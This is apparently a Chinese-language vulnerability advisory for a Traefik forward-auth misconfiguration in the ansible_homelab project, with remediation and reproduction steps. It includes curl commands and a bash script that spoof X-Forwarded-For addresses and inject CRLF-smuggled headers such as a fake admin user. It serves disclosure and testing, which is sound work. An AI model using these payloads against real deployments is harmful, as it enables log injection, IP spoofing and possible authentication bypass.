# CVE-2025-XXXXX: Forward Auth Header Injection in rishavnandi/ansible_homelab Traefik Configuration

## 基本信息

- **CVE ID**: CVE-2025-XXXXX (待分配)
- **项目**: rishavnandi/ansible_homelab
- **发现日期**: 2025-12-28
- **报告者**: Security Research
- **严重程度**: High (CVSS 7.5)
- **项目星级**: 371 stars

## 漏洞描述

rishavnandi/ansible_homelab 项目中的 Traefik Forward Auth 中间件配置存在 HTTP Header Injection 漏洞。Ansible 配置文件中设置了 `trustForwardHeader: true` 但没有配置 `trustedIPs` 白名单，导致 Traefik 信任所有来源的 X-Forwarded-* 头并转发到 Authelia 认证服务。

## 受影响文件

- `tasks/authelia.yml`

## 漏洞配置

```yaml
traefik.http.middlewares.authelia.forwardauth.trustForwardHeader: "true"
```

## 漏洞详情

### 问题分析

1. **配置问题**: `trustForwardHeader: true` 且**没有配置 trustedIPs**
2. **影响**: Traefik 会信任**所有来源**的 X-Forwarded-* 头并转发到 Authelia 认证服务
3. **攻击向量**: 攻击者可以直接向 Traefik 发送恶意请求

### 攻击场景

```
攻击者 → Traefik → Forward Auth (trustForwardHeader: true) → Authelia 认证服务
```

### 攻击载荷示例

```http
GET /protected HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1\r\nX-Auth-User: admin\r\n
```

## 影响评估

### CVSS 3.1 评分

- **Base Score**: 7.5 (High)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N

### 实际影响

1. **日志注入** ✅ **几乎肯定发生**
2. **IP 欺骗** ✅ **很可能发生**
3. **认证绕过** ⚠️ **可能发生**（如果 Authelia 实现不当）

## 威胁模型

同 CVE-2025-XXXXX-traefik-crowdsec-bouncer

## 修复建议

### 方案 1: 移除 trustForwardHeader 配置（推荐）

```yaml
# 移除这一行
# traefik.http.middlewares.authelia.forwardauth.trustForwardHeader: "true"
```

### 方案 2: 配置 trustedIPs 白名单

需要在 Traefik 配置文件中设置 trustedIPs。

## 漏洞复现

### 环境准备

1. **克隆项目仓库**:
   ```bash
   git clone https://github.com/rishavnandi/ansible_homelab.git
   cd ansible_homelab
   ```

2. **检查漏洞配置**:
   ```bash
   # 查看 Ansible 任务文件中的 Traefik 配置
   cat tasks/authelia.yml | grep -A 5 -B 5 "trustForwardHeader"
   ```

3. **部署配置** (使用 Ansible):
   ```bash
   # 运行 Ansible playbook（需要配置 inventory）
   ansible-playbook -i inventory playbook.yml
   ```

### 漏洞复现步骤

#### 步骤 1: 确认 Ansible 配置

```bash
# 查看 Authelia 任务的 Traefik 标签配置
cat tasks/authelia.yml | grep "traefik.http.middlewares.authelia"

# 应该看到：
# traefik.http.middlewares.authelia.forwardauth.trustForwardHeader: "true"
# 但没有 trustedIPs 配置
```

#### 步骤 2: 部署后检查 Traefik 配置

```bash
# 如果使用 Docker Compose 部署
docker inspect $(docker ps -q --filter "name=traefik") | jq '.[0].Config.Labels' | grep -i "authelia"

# 应该看到：
# "traefik.http.middlewares.authelia.forwardauth.trustForwardHeader": "true"
```

#### 步骤 3: 测试 Forward Auth Header Injection

```bash
# 获取 Traefik 服务地址（根据实际部署方式）
# 如果使用 Docker Compose
TRAEFIK_IP=$(docker ps -q --filter "name=traefik" | xargs docker inspect | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress')

# 如果使用 Kubernetes
TRAEFIK_IP=$(kubectl get svc traefik -o jsonpath='{.status.loadBalancer.ingress[0].ip}')

# 测试访问受 Authelia 保护的路由
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Forwarded-Proto: https" \
     -H "X-Forwarded-Host: evil.com" \
     http://$TRAEFIK_IP:80/protected

# 注入恶意头到 Authelia 认证服务
curl -v -H "X-Forwarded-For: 127.0.0.1\r\nX-Injected-Auth: malicious" \
     http://$TRAEFIK_IP:80/protected

# 使用 URL 编码的 CRLF
curl -v -H "X-Forwarded-For: 127.0.0.1%0D%0AX-Log-Injection: CRLF-TEST" \
     http://$TRAEFIK_IP:80/protected
```

#### 步骤 4: 测试 IP 欺骗（影响 Authelia 认证决策）

```bash
# 伪造本地 IP，可能绕过某些 IP 限制
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: 127.0.0.1" \
     http://$TRAEFIK_IP:80/protected

# 伪造内网 IP
curl -v -H "X-Forwarded-For: 10.0.0.1" \
     http://$TRAEFIK_IP:80/protected
```

#### 步骤 5: 验证漏洞

```bash
# 查看 Authelia 日志
docker logs $(docker ps -q --filter "name=authelia") | grep -i "forwarded" | tail -20

# 或使用 Kubernetes
kubectl logs -l app=authelia | grep -i "forwarded" | tail -20

# 查看 Traefik 日志
docker logs $(docker ps -q --filter "name=traefik") | tail -30
```

### 预期结果

1. **日志注入成功**: Authelia 认证服务日志中包含注入的恶意内容
2. **IP 欺骗成功**: Authelia 记录的 IP 地址是伪造的
3. **认证决策受影响**: 如果 Authelia 基于 IP 做决策，可能被绕过
4. **无验证**: Traefik 没有验证 X-Forwarded-* 头的来源，直接转发到 Authelia

### 自动化测试脚本

```bash
#!/bin/bash
# 根据实际部署方式获取 Traefik IP
if command -v docker &> /dev/null; then
    TRAEFIK_IP=$(docker ps -q --filter "name=traefik" | xargs docker inspect | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress')
elif command -v kubectl &> /dev/null; then
    TRAEFIK_IP=$(kubectl get svc traefik -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
else
    echo "Error: Cannot find Traefik IP"
    exit 1
fi

echo "[*] Testing Forward Auth Header Injection (Authelia)"
echo "[*] Target: $TRAEFIK_IP:80"

# Test 1: Basic Forward Auth injection
echo "[+] Test 1: Basic Forward Auth injection"
curl -s -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Injected-Auth: test" \
     http://$TRAEFIK_IP:80/protected > /dev/null

# Test 2: CRLF injection
echo "[+] Test 2: CRLF injection"
curl -s -H "X-Forwarded-For: 127.0.0.1%0D%0AX-Log-Injection: CRLF-TEST" \
     http://$TRAEFIK_IP:80/protected > /dev/null

# Test 3: IP spoofing
echo "[+] Test 3: IP spoofing"
curl -s -H "X-Forwarded-For: 10.0.0.1" \
     http://$TRAEFIK_IP:80/protected > /dev/null

echo "[*] Check Authelia logs for injected content"
```

## 备注

这是高星项目（371 stars），可能被广泛使用。Forward Auth 配置影响认证流程，建议尽快修复。

